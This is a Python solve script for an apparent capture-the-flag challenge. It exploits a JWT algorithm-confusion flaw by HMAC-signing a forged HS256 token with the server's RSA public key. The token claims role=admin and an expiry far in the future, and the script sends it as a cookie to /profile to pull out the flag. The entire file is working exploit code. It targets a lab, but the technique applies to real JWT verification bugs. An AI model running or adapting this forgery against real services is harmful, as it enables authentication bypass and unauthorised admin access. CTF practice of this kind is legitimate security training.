"""
solve.py — exploit for the SOAP Company Token Queue JWT alg-confusion bug.

Reads `public.pem` from disk, mints a forged HS256 token with role=admin,
and prints the cookie value + the flag fetched from /profile.

Usage:
    python3 solve.py                       # uses http://localhost:5000
    python3 solve.py http://target:5000    # any URL
    python3 solve.py http://target:5000 /path/to/public.pem
"""
import base64
import hashlib
import hmac
import json
import re
import sys
import urllib.error
import urllib.request


def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def mint_forged_token(public_pem: bytes) -> str:
    header = b64u(
        json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()
    )
    payload = b64u(
        json.dumps(
            {
                "sub": "admin",
                "role": "admin",
                "queue": "SOAP-999999",
                "iat": 0,
                "exp": 9_999_999_999,
            },
            separators=(",", ":"),
        ).encode()
    )
    signing_input = f"{header}.{payload}".encode("utf-8")
    sig = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64u(sig)}"


def fetch_with_cookie(url: str, cookie: str) -> tuple[int, str, str]:
    req = urllib.request.Request(url, headers={"Cookie": f"soap_token={cookie}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace"), url


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    pem_path = sys.argv[2] if len(sys.argv) > 2 else "public.pem"

    with open(pem_path, "rb") as fh:
        pub = fh.read()

    print(f"[+] using {pem_path} ({len(pub)} bytes)")
    print(f"[+] pubkey sha256: {hashlib.sha256(pub).hexdigest()}")
    print(f"[+] target       : {base}")

    token = mint_forged_token(pub)
    print(f"[+] forged token : {token}")

    status, body, final = fetch_with_cookie(f"{base}/profile", token)
    print(f"[+] /profile     : status={status} final={final}")

    flag = re.search(r"HTB\{[^}]+\}", body)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
        return 0

    if "Queue Number" in body:
        print("[-] redirected to queue — token rejected.")
        print("    most likely: your public.pem bytes don't match the server's.")
        print("    run this on the server:  curl -s <base>/api/debug/token -b soap_token=<token>")
        return 1

    print("[-] no flag in response. body excerpt:")
    print(body[:600])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
